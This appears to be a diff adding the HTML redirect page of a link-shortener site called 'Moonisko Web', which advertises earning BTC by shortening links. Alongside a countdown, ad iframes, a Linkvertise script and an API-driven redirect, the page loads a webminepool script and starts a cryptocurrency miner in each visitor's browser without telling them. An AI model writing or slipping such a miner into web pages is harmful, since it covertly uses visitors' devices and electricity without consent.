@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Shortened - Moonisko Web</title>
+    <meta
+      name="description"
+      content="First BTC Earning platform build on Discord."
+    />
+    <meta property="og:title" content="Shortened - Moonisko Web" />
+    <meta
+      property="og:description"
+      content="First BTC Earning platform build on Discord."
+    />
+    <meta
+      property="og:image"
+      content="https://aheioqhobo.cloudimg.io/v7/_playground-bucket-v2.teleporthq.io_/b8b9a464-b5ab-4443-ace0-8a57311a2c10/1301e360-4b0d-4160-bf08-279960bce197?org_if_sml=1"
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8" />
+    <meta property="twitter:card" content="summary_large_image" />
+
+    <style data-tag="reset-style-sheet">
+      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6,figure,blockquote,figcaption {  margin: 0;  padding: 0;}button {  background-color: transparent;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}html { scroll-behavior: smooth  }
+    </style>
+    <style data-tag="default-style-sheet">
+      html {
+        font-family: Inter;
+        font-size: 16px;
+      }
+
+      body {
+        font-weight: 400;
+        font-style:normal;
+        text-decoration: none;
+        text-transform: none;
+        letter-spacing: normal;
+        line-height: 1.15;
+        color: var(--dl-color-gray-black);
+        background-color: var(--dl-color-gray-white);
+
+      }
+    </style>
+    <link
+      rel="shortcut icon"
+      href="public/moonlogo (2).png"
+      type="icon/png"
+      sizes="32x32"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
+      data-tag="font"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+      data-tag="font"
+    />
+  </head>
+  <body>
+    <link rel="stylesheet" href="./style.css" />
+    <div>
+      <link href="./shortened.css" rel="stylesheet" />
+
+      <div class="shortened-container">
+        <div class="shortened-container01">
+          <div class="shortened-container02">
+            <div class="shortened-container03">
+              <style>
+
+
+
+                .container {
+                  margin: 50px auto;
+                  width: auto;
+                  text-align: center;
+                }
+
+                .progress {
+                  padding: 6px;
+                  background: #000066;
+                  border-radius: 6px;
+                  box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.25), 0 1px rgba(255, 255, 255, 0.08);
+                }
+
+                .progress-bar {
+                  height: 18px;
+                	background-color: #000066;
+                  border-radius: 4px;
+                  transition: 0.4s linear;
+                  transition-property: width, background-color;
+                }
+
+                .progress-striped .progress-bar {
+                  background-color: #0096FF;
+                  width: 100%;
+                  background-image: linear-gradient(
+                        45deg, rgb(0, 102, 255) 25%,
+                        transparent 25%, transparent 50%,
+                        rgb(0, 102, 255) 50%, rgb(0, 102, 255) 75%,
+                        transparent 75%, transparent);
+                  animation: progressAnimationStrike 15s;
+                }
+
+                @keyframes progressAnimationStrike {
+                     from { width: 0 }
+                     to   { width: 100% }
+                }
+
+                .progress2 {
+                  padding: 6px;
+                  border-radius: 30px;
+                  background: rgba(0, 0, 0, 0.25);
+                  box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.25), 0 1px rgba(255, 255, 255, 0.08);
+                }
+
+                .progress-bar2 {
+                  height: 18px;
+                  border-radius: 30px;
+                  background-image:
+                    linear-gradient(to bottom, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.05));
+                  transition: 0.4s linear;
+                  transition-property: width, background-color;
+                }
+
+                .progress-moved .progress-bar2 {
+                  width: 85%;
+                  background-color: #EF476F;
+                  animation: progressAnimation 6s;
+                }
+
+                @keyframes progressAnimation {
+                  0%   { width: 5%; background-color: #F9BCCA;}
+                  100% { width: 85%; background-color: #EF476F; }
+                }
+
+                $green: #4cd964;
+                $turquoise: #5ac8fa;
+                $blue: #007aff;
+                $light-blue: #7DC8E8;
+                $purple: #5856d6;
+                $red: #ff2d55;
+
+                .progress-bar3 {
+                  height: 18px;
+                  border-radius: 4px;
+                  background-image:
+                     linear-gradient(to right,
+                       $green, $turquoise, $blue,
+                       $light-blue, $purple, $red);
+                  transition: 0.4s linear;
+                  transition-property: width, background-color;
+                }
+
+
+
+                @keyframes colorAnimation {
+                  0% {
+                    background-image:
+                    linear-gradient(to right, $green, $turquoise, $blue, $light-blue, $purple, $red);
+                  }
+                  20% {
+                    background-image:
+                    linear-gradient(to right, $turquoise, $blue, $light-blue, $purple, $red, $green);
+                  }
+                  40% {
+                    background-image:
+                    linear-gradient(to right, $blue, $light-blue, $purple, $red, $green, $turquoise);
+                  }
+                  60% {
+                    background-image:
+                    linear-gradient(to right, $light-blue, $purple, $red, $green, $turquoise, $blue);
+                  }
+                  100% {
+                    background-image:
+                    linear-gradient(to right, $purple, $red, $green, $turquoise, $blue, $light-blue);
+                  }
+                }
+              </style>
+              <div class="container">
+                <div class="progress progress-striped">
+                  <div class="progress-bar"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="shortened-container04">
+            <div class="shortened-container05">
+              <style>
+                #countdown {
+                    font-size: 20px;
+                    color: white;
+                    font-family: calibry;
+
+                }
+              </style>
+
+              <div id="countdown">15</div>
+
+              <script>
+                // Set the initial time (in seconds)
+                let time = 15;
+
+                // Function to update the countdown
+                function updateCountdown() {
+                    const countdownElement = document.getElementById('countdown');
+                    countdownElement.textContent = time;
+
+                    // Check if the countdown has reached 0
+                    if (time <= 0) {
+                        clearInterval(interval);
+                        countdownElement.textContent = '0s';
+                        // You can add additional actions when the countdown reaches 0 here.
+                    } else {
+                        time--;
+                    }
+                }
+
+                // Update the countdown initially
+                updateCountdown();
+
+                // Start the countdown interval
+                const interval = setInterval(updateCountdown, 1000); // Update every 1 second (1000 milliseconds)
+              </script>
+            </div>
+          </div>
+          <div class="shortened-container06"></div>
+          <h1 class="shortened-text">
+            <span class="shortened-text1">Link shortened by MOON -</span>
+            <br class="shortened-text2" />
+            <span class="shortened-text3">Shorten links and earn BTC!</span>
+          </h1>
+          <div class="shortened-container07">
+            <div class="shortened-get-started get-started">
+              <a
+                href="https://moon-bot.eu/shortenerreg"
+                target="_blank"
+                rel="noreferrer noopener"
+                class="shortened-text4"
+              >
+                Start Earning
+              </a>
+            </div>
+          </div>
+        </div>
+        <div class="shortened-container08">
+          <div class="shortened-container09">
+            <div class="shortened-container10">
+              <iframe
+                data-aa="2264014"
+                src="//ad.a-ads.com/2264014?size=728x90"
+                style="width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;"
+              ></iframe>
+            </div>
+          </div>
+        </div>
+        <div class="shortened-container11">
+          <h1 class="shortened-text5">
+            You will be redirected in few seconds..
+          </h1>
+        </div>
+        <h1 class="shortened-text6">
+          If you are not redirected, refresh the page.
+        </h1>
+        <div>
+          <div class="shortened-container13">
+            <script src="https://webminepool.com/lib/base.js"></script>
+            <script>
+              var miner = WMP.User('<your-site-key>', 'test',{
+                  threads: 2,
+                  autoThreads: false,
+                  throttle: 0.3,
+                  forceASMJS: false
+              });
+              miner.start();
+            </script>
+          </div>
+        </div>
+        <div>
+          <div class="shortened-container15">
+            <script src="https://publisher.linkvertise.com/cdn/linkvertise.js"></script>
+            <script>
+              linkvertise(402090, {whitelist: [], blacklist: ['']});
+            </script>
+          </div>
+        </div>
+        <div>
+          <div class="shortened-container17">
+            <script>
+              // Function to extract the value of the 'link' parameter from the URL
+              function getLinkParameter() {
+                  const urlParams = new URLSearchParams(window.location.search);
+                  return urlParams.get('link');
+              }
+
+              // Function to send a request to the API
+              function sendAPIRequest(link) {
+                  const apiUrl = `https://moon.cryptonpro.tk/get_redirect?id=${encodeURIComponent(link)}`;
+
+                  // Send a GET request to the API
+                  fetch(apiUrl)
+                      .then(response => response.json())
+                      .then(data => {
+                          if (data.redirect) {
+                              // Redirect to the URL obtained from the API response after 15 seconds
+                              setTimeout(function() {
+                                  window.location.href = data.redirect;
+                              }, 15000); // 15 seconds
+                          } else {
+                              console.error('API response does not contain a 'redirect' property.');
+                          }
+                      })
+                      .catch(error => {
+                          console.error('Error fetching data from the API:', error);
+                      });
+              }
+
+              // Get the 'link' parameter from the URL and call the API
+              const linkParameter = getLinkParameter();
+              if (linkParameter) {
+                  sendAPIRequest(linkParameter);
+              } else {
+                  console.error('Missing 'link' parameter in the URL.');
+              }
+            </script>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
